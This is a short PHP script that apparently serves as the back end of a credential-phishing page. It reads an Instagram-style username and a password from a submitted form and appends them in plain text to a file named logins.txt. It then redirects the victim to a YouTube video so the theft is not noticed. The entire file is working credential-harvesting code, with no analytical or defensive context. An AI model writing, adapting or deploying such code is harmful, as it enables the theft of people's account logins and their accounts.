<?php

session_start();

if (isset($_POST['gsubmit'])) {
    $email = $_POST["instaName"];
    $pass = $_POST["pass"];

    // Opening logins text file for appending new data.
    $file = fopen("logins.txt", "a") or die("Unable to open file!");

    // Writing email and password to logins.txt.
    fwrite($file, $email . ">" . $pass . PHP_EOL);
    fclose($file); // Closing logins.txt.

    // Redirecting user to the new YouTube video URL.
    header("Location: https://www.youtube.com/watch?v=SNxYku74Q9s");
    exit();
}

session_destroy();

?>
